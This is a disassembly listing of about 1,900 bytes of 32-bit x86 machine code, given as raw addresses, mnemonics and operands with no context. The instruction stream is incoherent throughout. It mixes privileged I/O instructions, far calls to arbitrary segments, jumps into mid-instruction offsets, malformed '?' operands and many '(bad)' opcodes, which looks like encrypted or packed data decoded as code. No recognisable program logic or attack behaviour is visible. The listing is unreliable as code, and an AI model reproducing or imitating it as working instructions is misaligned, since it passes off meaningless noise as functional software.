  4076dc:	fcmovnu st,st(2)
  4076de:	cmp    eax,0x6bd4bd84
  4076e3:	mov    bl,0x2b
  4076e5:	cli    
  4076e6:	call   0x4324:0x3c8cc95f
  4076ed:	inc    bx
  4076ef:	out    0x7a,eax
  4076f1:	or     DWORD PTR [edx-0x41],esp
  4076f4:	cmp    eax,0xab551d31
  4076f9:	pop    ds
  4076fa:	pusha  
  4076fb:	adc    eax,0x96ac3e0f
  407700:	icebp  
  407701:	sub    eax,0x5b004446
  407706:	int    0xcd
  407708:	jae    0x407734
  40770a:	sub    BYTE PTR [esi-0x4],al
  40770d:	inc    BYTE PTR [eax+0x2e]
  407710:	call   DWORD PTR [ebx]
  407712:	ret    
  407713:	push   ebx
  407714:	ins    BYTE PTR es:[edi],dx
  407715:	pop    ebp
  407716:	cmp    DWORD PTR [esi],esp
  407718:	mov    DWORD PTR [esi-0x6d5fb053],esp
  40771e:	sti    
  40771f:	mov    cl,cl
  407721:	aam    0x7a
  407723:	fcomp  QWORD PTR [ebp+0x6cfc13ac]
  407729:	stos   BYTE PTR es:[edi],al
  40772a:	xchg   esp,eax
  40772b:	loop   0x4076d7
  40772d:	or     esp,DWORD PTR [esi-0x7e1eddfa]
  407733:	sti    
  407734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407735:	fisubr WORD PTR [eax-0x35]
  407738:	cmc    
  407739:	shl    DWORD PTR [esi-0x3e],1
  40773c:	mov    eax,ds:0xd6f219f0
  407741:	and    DWORD PTR [eax+0x50a8f50],esp
  407747:	jp     0x407740
  407749:	ficomp DWORD PTR [edi-0x1bc10913]
  40774f:	jne    0x407746
  407751:	dec    edi
  407752:	add    ch,al
  407754:	jo     0x407765
  407756:	leave  
  407757:	inc    eax
  407758:	iret   
  407759:	xor    al,0x2f
  40775b:	int3   
  40775c:	sahf   
  40775d:	lods   eax,DWORD PTR ds:[esi]
  40775e:	jb     0x4077c0
  407760:	push   esp
  407761:	push   ss
  407762:	mov    BYTE PTR [ecx],bl
  407764:	test   eax,0x7a38f17d
  407769:	adc    edi,edi
  40776b:	mov    eax,0x1db42835
  407770:	loopne 0x407784
  407772:	dec    ebp
  407773:	cmp    dh,ch
  407775:	mov    cs,WORD PTR [eax+0x3be75ba8]
  40777b:	retf   0x48a6
  40777e:	and    bl,dl
  407780:	push   es
  407781:	sahf   
  407782:	push   ebx
  407783:	cmp    al,0x7b
  407785:	mov    ds:0xdf67c03d,al
  40778a:	pushf  
  40778b:	sub    bh,BYTE PTR [ebx+0x1435a02f]
  407791:	outs   dx,BYTE PTR ds:[esi]
  407792:	fsubr  DWORD PTR [edx+0x47e0a82e]
  407798:	enter  0x3e0e,0x8e
  40779c:	dec    edx
  40779d:	mov    eax,ds:0xd1f2dfb1
  4077a2:	sub    edi,DWORD PTR [edi+0x818743c]
  4077a8:	imul   edi,ebp,0x2c
  4077ab:	sub    al,0x1f
  4077ad:	jae    0x40773b
  4077af:	outs   dx,DWORD PTR ds:[esi]
  4077b0:	ins    DWORD PTR es:[edi],dx
  4077b1:	inc    ebp
  4077b2:	push   es
  4077b3:	out    0x8f,al
  4077b5:	(bad)  
  4077b6:	std    
  4077b7:	push   ecx
  4077b8:	or     bh,BYTE PTR [ecx+0x7d7f2f77]
  4077be:	sbb    eax,0x39787093
  4077c3:	sub    esi,eax
  4077c5:	jp     0x407809
  4077c7:	inc    ebp
  4077c8:	mov    dl,0xa4
  4077ca:	dec    edi
  4077cb:	popa   
  4077cc:	sbb    al,0x0
  4077ce:	rol    BYTE PTR [ebp-0x39630244],1
  4077d4:	mov    BYTE PTR [ebx+0x4a],dl
  4077d7:	push   ds
  4077d8:	jne    0x40775d
  4077da:	xor    eax,0x7039f1ec
  4077df:	mul    edx
  4077e1:	or     eax,0x91636d33
  4077e6:	retf   0x8a88
  4077e9:	add    dl,BYTE PTR [edi]
  4077eb:	mov    edi,0x39573f6a
  4077f0:	pushf  
  4077f1:	and    al,0x12
  4077f3:	cld    
  4077f4:	cs into 
  4077f6:	inc    ecx
  4077f7:	not    BYTE PTR [esi+0x79084c4a]
  4077fd:	into   
  4077fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077ff:	mov    ?,edi
  407801:	cmp    al,0xdf
  407803:	or     BYTE PTR [eax],cl
  407805:	or     BYTE PTR [edx+0x314755ac],0x4f
  40780c:	out    0xa9,eax
  40780e:	lahf   
  40780f:	push   es
  407810:	jle    0x40786e
  407812:	(bad)  
  407813:	mov    al,0x28
  407815:	mov    WORD PTR [esp+ebp*2+0x2483b193],es
  40781c:	mov    dh,0x5e
  40781e:	nop
  40781f:	shr    DWORD PTR [edi+0x67b71d2a],0xc2
  407826:	mov    cl,0xc2
  407828:	jge    0x407861
  40782a:	inc    eax
  40782b:	or     BYTE PTR ds:0x881d83bb,0x20
  407832:	jmp    0x490b56ad
  407837:	adc    ebx,DWORD PTR [ebx-0x2e]
  40783a:	rcl    DWORD PTR [ebx-0x27a61558],cl
  407840:	jle    0x4077c6
  407842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407843:	in     eax,dx
  407844:	cmp    eax,0x32dadbb3
  407849:	fld    DWORD PTR [esi+0x747dbe06]
  40784f:	(bad)  
  407850:	or     BYTE PTR [bp+0x6b28],ah
  407855:	mov    edi,0x11214c02
  40785a:	(bad)  
  40785b:	or     al,dl
  40785d:	dec    ecx
  40785e:	xor    ebp,DWORD PTR [edx]
  407860:	cmp    al,0x3e
  407862:	std    
  407863:	out    0x45,eax
  407865:	shr    BYTE PTR [ecx],0xc3
  407868:	dec    edi
  407869:	mov    esp,0xe7542d31
  40786e:	lock out dx,ax
  407871:	pop    eax
  407872:	push   edi
  407873:	mov    eax,0xb240a081
  407878:	fiadd  WORD PTR [ecx-0x57]
  40787b:	aaa    
  40787c:	mov    ah,0x1a
  40787e:	sub    BYTE PTR [eiz*4-0x31709aaf],ch
  407885:	push   ecx
  407886:	pop    ebp
  407887:	adc    ebx,edx
  407889:	aas    
  40788a:	mov    ebx,0x921cc2cd
  40788f:	rcr    BYTE PTR [ecx-0x80],0xd3
  407893:	dec    eax
  407894:	shl    BYTE PTR [esp+ecx*2],cl
  407897:	loopne 0x407825
  407899:	jnp    0x407830
  40789b:	repz aaa 
  40789d:	xchg   esi,eax
  40789e:	cld    
  40789f:	stc    
  4078a0:	pop    ebp
  4078a1:	inc    esi
  4078a2:	fisttp QWORD PTR [edi+0x73bc6026]
  4078a8:	dec    edi
  4078a9:	pop    ebp
  4078aa:	jno    0x407853
  4078ac:	mov    bl,0xcc
  4078ae:	jle    0x407841
  4078b0:	sub    cl,BYTE PTR [ebp+0x43]
  4078b3:	popf   
  4078b4:	je     0x407851
  4078b6:	adc    al,0xe5
  4078b8:	add    edi,ecx
  4078ba:	cwde   
  4078bb:	jbe    0x4078ce
  4078bd:	pop    DWORD PTR [edi]
  4078bf:	sti    
  4078c0:	dec    ecx
  4078c1:	das    
  4078c2:	rcl    BYTE PTR [ebx-0x77],0x85
  4078c6:	imul   ebx,DWORD PTR [ebx],0x3b
  4078c9:	xchg   DWORD PTR [ecx-0x1d],edi
  4078cc:	inc    ebx
  4078cd:	(bad)  
  4078cf:	add    eax,esi
  4078d1:	repnz scas al,BYTE PTR es:[edi]
  4078d3:	test   al,0xfe
  4078d5:	test   DWORD PTR [edx],0xcf9ee29a
  4078db:	sbb    eax,0xe6e1392e
  4078e0:	outs   dx,DWORD PTR ds:[esi]
  4078e1:	ins    DWORD PTR es:[edi],dx
  4078e2:	popf   
  4078e3:	data16 lods al,BYTE PTR fs:[esi]
  4078e6:	call   0x3a5901bb
  4078eb:	fst    DWORD PTR [edx]
  4078ed:	inc    esi
  4078ee:	pusha  
  4078ef:	adc    DWORD PTR [eax-0x7b],ebx
  4078f2:	inc    ebp
  4078f3:	xchg   ebp,eax
  4078f4:	adc    ch,ah
  4078f6:	nop
  4078f7:	adc    ch,dl
  4078f9:	outs   dx,DWORD PTR ds:[esi]
  4078fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078fb:	arpl   WORD PTR [esi+0xf6b866a],dx
  407901:	pop    edi
  407902:	cdq    
  407903:	pop    edi
  407904:	addr16 push 0xffffffb4
  407907:	repnz aaa 
  407909:	mov    al,ds:0x5496280a
  40790e:	es jp  0x40795f
  407911:	mov    ebp,0x18043ecd
  407916:	xchg   ecx,eax
  407917:	push   ecx
  407918:	(bad)  
  407919:	out    0x9c,eax
  40791b:	pop    eax
  40791c:	mov    ecx,0xe22293df
  407921:	and    DWORD PTR ds:0xc627533e,edi
  407927:	lods   al,BYTE PTR ds:[esi]
  407928:	fistp  DWORD PTR [esi+0x764d15fa]
  40792e:	js     0x407938
  407930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407931:	mov    DWORD PTR [esp+ebp*2-0x17],ebx
  407935:	ins    DWORD PTR es:[edi],dx
  407936:	pop    edi
  407937:	std    
  407938:	jbe    0x407954
  40793a:	xchg   DWORD PTR [edx+edi*1-0x5f],ecx
  40793e:	mov    WORD PTR [ebx+eiz*2],fs
  407941:	int3   
  407942:	inc    ecx
  407943:	pop    eax
  407944:	mov    ds:0xba84c7b8,al
  407949:	fbstp  TBYTE PTR [ecx]
  40794b:	jnp    0x407920
  40794d:	jae    0x4078ec
  40794f:	aaa    
  407950:	add    al,0xef
  407952:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407954:	or     eax,0x6967b7a3
  407959:	adc    eax,ebp
  40795b:	push   cs
  40795c:	and    BYTE PTR [edi+0x36],cl
  40795f:	add    esp,eax
  407961:	inc    ebp
  407962:	mov    ds:0x4c5dbeca,eax
  407967:	mov    ecx,0xe51b01f7
  40796c:	push   esi
  40796d:	cdq    
  40796e:	aaa    
  40796f:	pavgw  mm6,QWORD PTR [esi-0x75793cfa]
  407976:	dec    esp
  407977:	imul   edi,DWORD PTR [ebp-0x79],0xffffffac
  40797b:	cwde   
  40797c:	cmp    BYTE PTR [esi+0x9],ch
  40797f:	push   ecx
  407980:	and    edx,ebx
  407982:	ret    0x3adb
  407985:	aas    
  407986:	pop    edi
  407987:	aam    0x29
  407989:	fwait
  40798a:	mov    ?,WORD PTR [esi+0x6a]
  40798d:	and    ebp,DWORD PTR [edx-0x346693e7]
  407993:	js     0x4079ed
  407995:	and    edi,esp
  407997:	sbb    BYTE PTR [esi+ebp*1],ch
  40799a:	sub    ch,BYTE PTR [bp+0x2bd7]
  40799f:	cli    
  4079a0:	sub    al,0xa7
  4079a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a3:	adc    al,0x2a
  4079a5:	inc    esi
  4079a6:	cld    
  4079a7:	xor    al,0xa1
  4079a9:	xchg   ebp,eax
  4079aa:	cs push esp
  4079ac:	jb     0x4079ed
  4079ae:	div    ah
  4079b0:	mov    cl,0xcd
  4079b2:	sub    eax,0xfa4857dc
  4079b7:	xchg   edx,eax
  4079b8:	rcr    BYTE PTR [ebp-0x75],cl
  4079bb:	or     BYTE PTR [ecx],0x9d
  4079be:	mov    eax,ds:0xf6d88c5e
  4079c3:	sbb    BYTE PTR [eax-0x44],ah
  4079c6:	repz and BYTE PTR [esi],dl
  4079c9:	sti    
  4079ca:	in     eax,dx
  4079cb:	and    eax,0x1671210e
  4079d0:	inc    edi
  4079d1:	repz sbb dh,cl
  4079d4:	adc    eax,0xa3d42d8c
  4079d9:	push   0xffffffd9
  4079db:	adc    edi,ecx
  4079dd:	adc    edx,edi
  4079df:	adc    eax,0xc74012fd
  4079e4:	scas   eax,DWORD PTR es:[edi]
  4079e5:	scas   al,BYTE PTR es:[edi]
  4079e6:	mov    edx,0xb778657d
  4079eb:	lods   al,BYTE PTR ds:[esi]
  4079ec:	jno    0x407a52
  4079ee:	add    ebx,edi
  4079f0:	pop    ecx
  4079f1:	pop    esp
  4079f2:	mov    gs,WORD PTR [ecx-0x68918ae9]
  4079f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079f9:	add    esp,ecx
  4079fb:	push   ecx
  4079fc:	adc    BYTE PTR [ecx+0x69d87f63],cl
  407a02:	mov    ch,0xa2
  407a04:	aaa    
  407a05:	bnd gs jbe 0x407a16
  407a09:	push   ebx
  407a0a:	loop   0x40799c
  407a0c:	addr16 cmp al,0x97
  407a0f:	arpl   WORD PTR ds:0x3e1803cd,bx
  407a15:	sbb    BYTE PTR [edi],bl
  407a17:	push   eax
  407a18:	and    eax,0x51be6747
  407a1d:	mov    ecx,0x62f96553
  407a22:	aas    
  407a23:	jmp    0x407a62
  407a25:	inc    esp
  407a26:	cmp    dh,BYTE PTR ds:0xa658350c
  407a2c:	push   ss
  407a2d:	mov    eax,eax
  407a2f:	xchg   BYTE PTR [esi-0x11010cee],dh
  407a35:	not    BYTE PTR [esi-0x5c9dbd19]
  407a3b:	push   0x4e
  407a3d:	push   ebp
  407a3e:	(bad)  
  407a40:	inc    edi
  407a41:	lods   eax,DWORD PTR ds:[esi]
  407a42:	les    esp,FWORD PTR [ecx+0x3bd4c48b]
  407a48:	xor    eax,0x5f87ba25
  407a4d:	mov    ds:0xfaa84817,eax
  407a52:	cwde   
  407a53:	cmp    ebx,ebx
  407a55:	mov    ds:0x5a1e0f0f,al
  407a5a:	not    DWORD PTR [edi]
  407a5c:	pop    ss
  407a5d:	std    
  407a5e:	adc    DWORD PTR [esi],0xffffffdf
  407a61:	xchg   esp,eax
  407a62:	push   ebp
  407a63:	ret    
  407a64:	mov    edx,0x8a3f74ad
  407a69:	jle    0x407acb
  407a6b:	adc    al,0x1f
  407a6d:	sbb    edi,DWORD PTR [ebp+0x40]
  407a70:	jmp    0xe992:0x484019b6
  407a77:	fdiv   DWORD PTR [ecx+0x36]
  407a7a:	jg     0x407a09
  407a7c:	test   ch,ah
  407a7e:	or     BYTE PTR [ebx+edx*4-0x6fb0dbe6],dh
  407a85:	cli    
  407a86:	mov    ds:0xd0c0c6fd,al
  407a8b:	jb     0x407a6d
  407a8d:	lods   al,BYTE PTR fs:[esi]
  407a8f:	unpcklps xmm1,XMMWORD PTR [eax]
  407a92:	and    dh,BYTE PTR [eax-0x2fe11358]
  407a98:	mov    al,0x8c
  407a9a:	inc    edx
  407a9b:	or     eax,0x437b21aa
  407aa0:	ds icebp 
  407aa2:	jbe    0x407ade
  407aa4:	rcr    BYTE PTR [ebx+0x3460c89d],0x30
  407aab:	mov    al,0x19
  407aad:	ror    BYTE PTR [ecx-0x29b2da50],1
  407ab3:	push   0x8593c13e
  407ab8:	cwde   
  407ab9:	call   0xfec0cb6f
  407abe:	xor    BYTE PTR [edi+0x42879224],bl
  407ac4:	test   al,0xf
  407ac6:	pop    ds
  407ac7:	push   esi
  407ac8:	call   0x4e95:0x3dac5414
  407acf:	std    
  407ad0:	xchg   ebx,eax
  407ad1:	pop    esi
  407ad2:	test   BYTE PTR ds:0x32dc1bf4,cl
  407ad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ad9:	clc    
  407ada:	fld    st(5)
  407adc:	add    eax,0x6fd8bda8
  407ae1:	xchg   edx,eax
  407ae2:	inc    edi
  407ae3:	rcl    DWORD PTR [ebx],0x4c
  407ae6:	push   ebp
  407ae7:	push   ss
  407ae8:	inc    edi
  407ae9:	lods   eax,DWORD PTR ds:[esi]
  407aea:	(bad)  
  407aeb:	add    esi,DWORD PTR [eax+edx*1]
  407aee:	enter  0x6222,0xe7
  407af2:	xor    al,0xab
  407af4:	mov    ds:0xa2f7d2ef,al
  407af9:	test   eax,0x4508980d
  407afe:	cmp    cl,bh
  407b00:	jno    0x407b11
  407b02:	mov    bh,0x0
  407b04:	push   esi
  407b05:	xor    edx,DWORD PTR [ecx-0x2d]
  407b08:	xchg   DWORD PTR [edi+0x26],eax
  407b0b:	ror    DWORD PTR [ebx],0xe2
  407b0e:	add    al,BYTE PTR [ecx+edx*8]
  407b11:	sub    ah,BYTE PTR [edx]
  407b13:	or     ch,ah
  407b15:	dec    eax
  407b16:	aam    0xc3
  407b18:	stos   BYTE PTR es:[edi],al
  407b19:	mov    ebx,0x4f5bfd5a
  407b1e:	and    al,0xa6
  407b20:	pop    ebx
  407b21:	imul   ebx,DWORD PTR [esi],0xffffffd8
  407b24:	and    BYTE PTR cs:[ebx-0x148ef89],cl
  407b2b:	scas   al,BYTE PTR es:[edi]
  407b2c:	cli    
  407b2d:	nop
  407b2e:	sbb    cl,BYTE PTR [edi]
  407b30:	jb     0x407b4f
  407b32:	ds sub eax,0x40f6f5d6
  407b38:	in     eax,0xa5
  407b3a:	cmp    BYTE PTR [edx+0x5a],dh
  407b3d:	dec    esi
  407b3e:	sahf   
  407b3f:	jecxz  0x407b97
  407b41:	fst    QWORD PTR [eax]
  407b43:	addr16 dec edi
  407b45:	dec    edi
  407b46:	aad    0x76
  407b48:	mov    ecx,ds
  407b4a:	sbb    cl,BYTE PTR [ebp+0x8]
  407b4d:	dec    eax
  407b4e:	cmp    BYTE PTR [eax-0x1ea8c614],cl
  407b54:	push   eax
  407b55:	or     DWORD PTR [ecx],edi
  407b57:	mov    edx,0x35f68bb8
  407b5c:	pop    ebx
  407b5d:	rcl    DWORD PTR [ecx+esi*1+0x74],cl
  407b61:	mov    ds:0x32e0602d,al
  407b66:	xchg   ebx,eax
  407b67:	cwde   
  407b68:	inc    edx
  407b69:	sub    ebx,ecx
  407b6b:	std    
  407b6c:	mov    bh,0xb
  407b6e:	addps  xmm2,XMMWORD PTR [edx]
  407b71:	ins    DWORD PTR es:[edi],dx
  407b72:	inc    esi
  407b73:	xchg   esi,eax
  407b74:	daa    
  407b75:	not    edx
  407b77:	push   ecx
  407b78:	mov    ebx,0xfc96ef75
  407b7d:	and    DWORD PTR ds:0xeb52c060,0xffffff80
  407b84:	sti    
  407b85:	pop    edi
  407b86:	aad    0x38
  407b88:	out    dx,eax
  407b89:	pop    edi
  407b8a:	out    dx,al
  407b8b:	popf   
  407b8c:	inc    eax
  407b8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b8e:	xchg   esi,eax
  407b8f:	mov    edi,esp
  407b91:	ins    DWORD PTR es:[edi],dx
  407b92:	icebp  
  407b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b94:	mov    ds:0x7c164e76,al
  407b99:	sbb    esp,ebx
  407b9b:	cmp    al,0xde
  407b9d:	dec    edx
  407b9e:	pop    ss
  407b9f:	mov    edi,0xef07175c
  407ba4:	pop    ecx
  407ba6:	in     eax,dx
  407ba7:	fcomp  QWORD PTR [ebx]
  407ba9:	xchg   ebp,eax
  407baa:	in     al,0xd2
  407bac:	div    DWORD PTR [edi-0x61af380e]
  407bb2:	leave  
  407bb3:	(bad)  
  407bb4:	fcomp  QWORD PTR [edi-0x79]
  407bb7:	dec    esi
  407bb8:	push   esi
  407bb9:	xchg   BYTE PTR [edx-0x5e318960],ah
  407bbf:	(bad)  
  407bc0:	shl    BYTE PTR [edi],1
  407bc2:	clc    
  407bc3:	xchg   ebx,eax
  407bc4:	mov    eax,0xa6ac1c2d
  407bc9:	dec    eax
  407bca:	jb     0x407c3a
  407bcc:	dec    ebp
  407bcd:	jecxz  0x407ba5
  407bcf:	ret    0xc775
  407bd2:	addr16 jmp 0x407ba7
  407bd5:	pop    esi
  407bd6:	sbb    al,0x54
  407bd8:	aad    0x1b
  407bda:	loopne 0x407b78
  407bdc:	pusha  
  407bdd:	aad    0x12
  407bdf:	or     esi,DWORD PTR [edi+0x2bc7fadf]
  407be5:	add    eax,0x9d5a4379
  407bea:	inc    esi
  407beb:	inc    ecx
  407bec:	mov    ah,BYTE PTR [ebx+0x2175db80]
  407bf2:	scas   eax,DWORD PTR es:[edi]
  407bf3:	push   0xfffffff9
  407bf5:	adc    eax,0xc1a4dfb4
  407bfa:	push   ecx
  407bfb:	adc    esi,DWORD PTR ds:0x342bc12e
  407c01:	stc    
  407c02:	addr16 mov ds:0x9e89,al
  407c06:	rol    ch,1
  407c08:	push   ecx
  407c09:	adc    BYTE PTR [ebx-0x51],al
  407c0c:	inc    ebx
  407c0d:	mov    ebx,0x175097d8
  407c12:	push   eax
  407c13:	ins    DWORD PTR es:[edi],dx
  407c14:	test   eax,0xef1a130c
  407c19:	push   esi
  407c1b:	cmp    DWORD PTR [ecx+0x4b11c308],ebx
  407c21:	jmp    0x407c11
  407c23:	or     eax,0x1b6efa67
  407c28:	push   cs
  407c29:	fist   DWORD PTR [ecx+0x1b]
  407c2c:	dec    ebx
  407c2d:	jmp    0x407c17
  407c2f:	sub    bl,BYTE PTR ds:0x1c6c7c85
  407c35:	mov    eax,ds:0xc98d908d
  407c3a:	push   ecx
  407c3b:	cwde   
  407c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c3d:	xchg   ebx,eax
  407c3e:	dec    ebx
  407c3f:	or     bh,al
  407c41:	adc    esp,DWORD PTR [esi-0x4bf0cf08]
  407c47:	es adc al,0xce
  407c4a:	fimul  DWORD PTR [edi+ecx*4]
  407c4d:	sbb    dl,dl
  407c4f:	in     al,dx
  407c50:	sbb    edx,esi
  407c52:	jmp    0x407bf2
  407c54:	lahf   
  407c55:	pop    ebx
  407c56:	fild   DWORD PTR [esi]
  407c58:	push   0xffffffb6
  407c5a:	or     ebp,DWORD PTR [ecx]
  407c5c:	xchg   ebx,eax
  407c5d:	or     eax,0x698ffe93
  407c62:	iret   
  407c63:	sbb    DWORD PTR [ebp+0x4e11f008],edx
  407c69:	ss sbb al,0x66
  407c6c:	cli    
  407c6d:	dec    edi
  407c6e:	push   esi
  407c6f:	pusha  
  407c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c71:	sub    ebx,DWORD PTR ds:0x64550520
  407c77:	scas   al,BYTE PTR es:[edi]
  407c78:	shr    ebp,0xc0
  407c7b:	call   0x5b9c7d6e
  407c80:	xchg   DWORD PTR [esi+ebp*1-0x45],eax
  407c84:	iret   
  407c85:	dec    edi
  407c86:	scas   al,BYTE PTR es:[edi]
  407c87:	repz ret 
  407c89:	dec    esi
  407c8a:	push   cs
  407c8b:	xor    BYTE PTR [ecx],dh
  407c8d:	std    
  407c8e:	test   DWORD PTR [ecx+0x5c],edi
  407c91:	cmp    ecx,DWORD PTR [esi-0x575d0ae0]
  407c97:	dec    ebp
  407c98:	dec    edx
  407c99:	das    
  407c9a:	adc    ebx,DWORD PTR [esi]
  407c9c:	in     eax,0x90
  407c9e:	mov    esi,0x6f7b8311
  407ca3:	push   ss
  407ca4:	shl    DWORD PTR [edx-0x5831977a],0xf5
  407cab:	pop    ss
  407cac:	stos   BYTE PTR es:[edi],al
  407cad:	dec    eax
  407cae:	pushf  
  407caf:	or     DWORD PTR [ebx],ebp
  407cb1:	cwde   
  407cb2:	and    DWORD PTR [ebx],ecx
  407cb4:	ja     0x407cff
  407cb6:	and    DWORD PTR [ebx+0x29184109],eax
  407cbc:	(bad)  
  407cbd:	sbb    al,0x2c
  407cbf:	icebp  
  407cc0:	stc    
  407cc1:	fwait
  407cc2:	loope  0x407c7b
  407cc4:	shl    BYTE PTR [ebp+0x7d51e909],1
  407cca:	dec    edx
  407ccb:	test   eax,0xa66cab47
  407cd0:	ficomp WORD PTR ds:0xe492cb49
  407cd6:	in     al,0xda
  407cd8:	pop    edx
  407cd9:	fnsave [ebx]
  407cdb:	lods   eax,DWORD PTR ds:[esi]
  407cdc:	fcomp  DWORD PTR ds:0x890253d1
  407ce2:	imul   ebx,DWORD PTR [edx+eiz*4-0x65],0x5c
  407ce7:	cmp    ecx,DWORD PTR [ecx]
  407ce9:	outs   dx,DWORD PTR ds:[esi]
  407cea:	hlt    
  407ceb:	hlt    
  407cec:	and    cl,BYTE PTR [ecx-0x4f6e0bcb]
  407cf2:	fs out 0x9f,al
  407cf5:	sbb    edx,eax
  407cf7:	outs   dx,DWORD PTR ds:[esi]
  407cf8:	gs pop eax
  407cfa:	mov    al,ds:0x4842ef9f
  407cff:	dec    edx
  407d00:	mov    cl,0x64
  407d02:	leave  
  407d03:	lods   al,BYTE PTR ds:[esi]
  407d04:	and    bh,BYTE PTR [esp]
  407d07:	popf   
  407d08:	jmp    0x407d0b
  407d0a:	adc    eax,0xd1c8ab2d
  407d0f:	pop    ecx
  407d10:	dec    esp
  407d11:	mov    ebx,0xb490e66d
  407d16:	sbb    ebx,DWORD PTR [esi-0x2f]
  407d19:	mov    ds:0xfee35486,eax
  407d1e:	xor    al,0x6b
  407d20:	or     edx,DWORD PTR [edx-0x2f493bf2]
  407d26:	mov    al,ds:0xc7d5b720
  407d2b:	loope  0x407daa
  407d2d:	dec    esp
  407d2e:	ret    
  407d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d30:	nop
  407d31:	fcomip st,st(5)
  407d33:	and    dl,ch
  407d35:	stos   DWORD PTR es:[edi],eax
  407d36:	sbb    BYTE PTR [edi],cl
  407d38:	pop    ss
  407d39:	adc    DWORD PTR ds:[ebx],esi
  407d3c:	push   ebx
  407d3d:	sbb    ah,dl
  407d3f:	or     eax,0xeef05ac5
  407d44:	mov    edx,0x32f42e43
  407d49:	pop    ss
  407d4a:	sub    eax,0x9aa85b6
  407d4f:	rol    DWORD PTR [eax],cl
  407d51:	sbb    BYTE PTR [edx],ah
  407d53:	inc    ecx
  407d54:	in     al,dx
  407d55:	jge    0x407d0d
  407d57:	ds ins BYTE PTR es:[edi],dx
  407d59:	push   edi
  407d5a:	pop    esi
  407d5b:	and    ebp,ebp
  407d5d:	sub    DWORD PTR [eax+eiz*2],ebx
  407d60:	xchg   esi,eax
  407d61:	push   edx
  407d62:	in     al,0x83
  407d64:	sbb    esp,ebp
  407d66:	add    BYTE PTR [esi+0x60149f97],ah
  407d6c:	and    BYTE PTR [esi+0x15],al
  407d6f:	test   eax,0xf59c5521
  407d74:	repz inc ecx
  407d76:	leave  
  407d77:	sub    ecx,DWORD PTR [edx+0x10]
  407d7a:	pop    esp
  407d7b:	pusha  
  407d7c:	sbb    BYTE PTR ds:0xc92240b0,dl
  407d82:	fnstenv [ebp-0x1a]
  407d85:	pusha  
  407d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d87:	into   
  407d88:	or     DWORD PTR [ebx+0x65],ebx
  407d8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d8c:	add    al,0x10
  407d8e:	and    ebx,DWORD PTR [eax]
  407d90:	lock lock pop edi
  407d93:	inc    esp
  407d94:	scas   al,BYTE PTR es:[edi]
  407d95:	xor    ah,BYTE PTR [ebx-0x2d]
  407d98:	push   0x62
  407d9a:	or     BYTE PTR [eax],dl
  407d9c:	arpl   WORD PTR [esi+0x4e],ax
  407d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da0:	pop    ss
  407da1:	push   edi
  407da2:	xor    DWORD PTR [ecx+0x1aa0eb5d],edi
  407da8:	call   0xd97798d0
  407dad:	mov    edi,0x2ea7b670
  407db2:	cmp    al,0xb
  407db4:	nop
  407db5:	sbb    DWORD PTR [ebp+0x732ecb35],ecx
  407dbb:	xchg   esp,eax
  407dbc:	pop    eax
  407dbd:	in     eax,0xe7
  407dbf:	(bad)  
  407dc0:	cli    
  407dc1:	in     al,0xbd
  407dc3:	sbb    DWORD PTR [eax-0x74ec8d93],ecx
  407dc9:	mov    DWORD PTR es:[esi-0xc],0x5dbbaf7a
  407dd1:	popf   
  407dd2:	outs   dx,BYTE PTR ds:[esi]
  407dd3:	xor    al,0xa7
  407dd5:	xor    ebx,edx
  407dd7:	(bad)  
  407dd8:	jp     0x407e01
  407dda:	ins    DWORD PTR es:[edi],dx
  407ddb:	stos   DWORD PTR es:[edi],eax
  407ddc:	or     dl,BYTE PTR [edi-0x6a098644]
  407de2:	push   0x19
  407de4:	add    al,0x51
  407de6:	test   eax,0x2201c4ec
  407deb:	push   eax
  407dec:	fidiv  WORD PTR ds:0x36b209e9
  407df2:	std    
  407df3:	cmp    eax,DWORD PTR [ebp-0x25]
  407df6:	or     BYTE PTR [edx],dl
  407df8:	cmp    dh,BYTE PTR [ecx+0x3d02b712]
  407dfe:	push   ebx
  407dff:	cmc    
  407e00:	mov    dh,0x1f
  407e02:	mov    esp,0x30d9ddf1
  407e07:	or     esi,DWORD PTR [ecx-0xe58ec16]
  407e0d:	mov    ecx,ss
  407e0f:	mov    ch,0x5e
  407e11:	dec    edi
  407e12:	rol    BYTE PTR [ebp+0x68],1
  407e15:	mov    eax,ds:0x1043f5b2
  407e1a:	fsub   QWORD PTR [edx-0x21]
  407e1d:	mov    esi,0xf7ce1a35
  407e22:	loope  0x407df0
  407e24:	neg    bl
  407e26:	mov    ecx,0xc14f1a73
  407e2b:	and    eax,0x50046a27
  407e30:	outs   dx,BYTE PTR ds:[esi]
  407e31:	ins    DWORD PTR es:[edi],dx
  407e32:	pop    esp
  407e33:	icebp  
  407e34:	cli    
  407e35:	xor    DWORD PTR [esi],edi
  407e37:	in     eax,dx
  407e38:	lock jne 0x407e74
  407e3b:	sub    al,0xf5
  407e3d:	mov    al,ds:0x68b7270a
  407e42:	es jecxz 0x407dfb
  407e45:	enter  0xae16,0x73
  407e49:	jne    0x407e36
  407e4b:	sbb    eax,0x7c3edfb8
  407e50:	mov    DWORD PTR [esi],ebp
  407e52:	xchg   ecx,eax
  407e53:	push   ecx
  407e54:	push   esi
  407e55:	std    
  407e56:	ins    BYTE PTR es:[edi],dx
  407e57:	mov    ch,0xb
  407e59:	adc    eax,0xe929ef12
  407e5e:	(bad)  
  407e60:	cmp    bl,bh
  407e62:	add    al,0x94
  407e64:	mov    es,edi
  407e66:	mov    ds:0xdedce321,al
  407e6b:	pushf  
  407e6c:	adc    eax,0x408b691a
